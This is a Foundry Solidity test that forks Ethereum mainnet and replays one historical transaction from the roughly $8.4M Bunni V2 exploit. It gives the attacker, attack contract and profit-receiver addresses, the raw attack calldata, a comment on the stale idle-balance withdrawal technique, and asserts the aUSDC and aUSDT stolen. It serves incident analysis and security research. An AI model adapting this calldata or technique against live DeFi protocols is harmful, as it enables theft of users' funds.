// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

// @KeyInfo - Total Lost: ~$8.4M
// Attacker: 0x0C3d8fA7762Ca5225260039ab2d3990C035B458D
// Attack contract: 0x657D8bCcdd9C6e1Da8DA1E7D331cfDea8357Adbc
// Attack Tx: https://etherscan.io/tx/0x1c27c4d625429acfc0f97e466eda725fd09ebdc77550e529ba4cbdbc33beb97b
// @Info
// Vulnerable contract: https://etherscan.io/address/0x000000000049C7bcBCa294E63567b4D21EB765f1
// Post-mortem: https://blog.bunni.xyz/posts/sep-2-hack-post-mortem/

interface IERC20Bunni {
    function balanceOf(
        address account
    ) external view returns (uint256);
}

contract BunniV2ExploitTest is Test {
    address private constant ATTACKER = 0x0C3d8fA7762Ca5225260039ab2d3990C035B458D;
    address private constant ATTACK_CONTRACT = 0x657D8BcCDD9C6e1Da8DA1e7d331CFdeA8357AdBc;
    address private constant PROFIT_RECEIVER = 0xE04eFD87F410e260cf940a3bcb8BC61f33464f2b;

    IERC20Bunni private constant A_USDC = IERC20Bunni(0x98C23E9d8f34FEFb1B7BD6a91B7FF122F4e16F5c);
    IERC20Bunni private constant A_USDT = IERC20Bunni(0x23878914EFE38d27C4D67Ab83ed1b93A74D4086a);

    function setUp() public {
        vm.createSelectFork("mainnet", 23_273_097);
        vm.label(ATTACKER, "Attacker");
        vm.label(ATTACK_CONTRACT, "Attacker helper");
        vm.label(PROFIT_RECEIVER, "Profit receiver");
    }

    function testExploit() public {
        uint256 ausdcBefore = A_USDC.balanceOf(PROFIT_RECEIVER);
        uint256 ausdtBefore = A_USDT.balanceOf(PROFIT_RECEIVER);

        // Replay the historical call against pre-attack state. The parameters drive the Bunni pool to
        // an extreme tick, repeatedly withdraw while its idle-balance accounting is stale, then unwind.
        bytes memory attackCalldata =
            hex"90f79253000000000000000000000000000000000049c7bcbca294e63567b4d21eb765f1000000000000000000000000000052423c1db6b7ff8641b85a7eefc7b2791888000000000000000000000000c92c2ba90213fc3048a527052b0b4febfa71676300000000000000000000000000000000000000000000000000000000000001f4000000000000000000000000000000000000000000000000000000000000002cffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffd8f0000000000000000000000000000000000000000000000000000000000000138800000000000000000000000000000000000000000000000000000000000f424000000000000000000000000000000000000000000000000000000000000f4240000000000000000000000000000000000000000000000000000000000000003200000000000000000000000000000000000000000000000000000000000000320000000000000000000000000000000000000000000000000000000000000019";

        vm.prank(ATTACKER, ATTACKER);
        (bool success,) = ATTACK_CONTRACT.call(attackCalldata);
        assertTrue(success, "historical exploit call reverted");

        uint256 ausdcProfit = A_USDC.balanceOf(PROFIT_RECEIVER) - ausdcBefore;
        uint256 ausdtProfit = A_USDT.balanceOf(PROFIT_RECEIVER) - ausdtBefore;
        emit log_named_decimal_uint("aUSDC profit", ausdcProfit, 6);
        emit log_named_decimal_uint("aUSDT profit", ausdtProfit, 6);

        // This is one representative transaction from the multi-transaction, multi-pool exploit.
        assertEq(ausdcProfit, 1_509_580.429012e6);
        assertEq(ausdtProfit, 1_041_353.965105e6);
    }
}
